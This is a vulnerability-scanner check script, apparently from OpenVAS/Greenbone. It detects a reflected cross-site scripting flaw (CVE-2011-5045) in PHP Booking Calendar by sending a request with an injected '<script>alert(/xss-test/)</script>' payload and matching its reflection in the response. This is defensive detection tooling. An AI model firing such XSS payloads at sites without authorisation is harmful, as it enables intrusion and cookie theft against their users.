if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103376" );
	script_bugtraq_id( 51119 );
	script_cve_id( "CVE-2011-5045" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "PHP Booking Calendar 'page_info_message' Parameter Cross Site Scripting Vulnerability" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-01-04 15:47:28 +0100 (Wed, 04 Jan 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51119" );
	script_xref( name: "URL", value: "http://sourceforge.net/projects/bookingcalendar/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/520929" );
	script_tag( name: "summary", value: "PHP Booking Calendar is prone to a cross-site scripting vulnerability
  because it fails to sufficiently sanitize user-supplied data." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker
  to steal cookie-based authentication credentials and launch other attacks." );
	script_tag( name: "affected", value: "PHP Booking Calendar 10e is vulnerable, other versions may also
  be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove
  the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/booking_calendar", "/cal", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/details_view.php?event_id=1&date=2000-12-01&view=month&loc=loc1&page_info_message=<script>alert(/xss-test/)</script>";
	if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(/xss-test/\\)</script>", check_header: TRUE, extra_check: "Booking Calendar" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

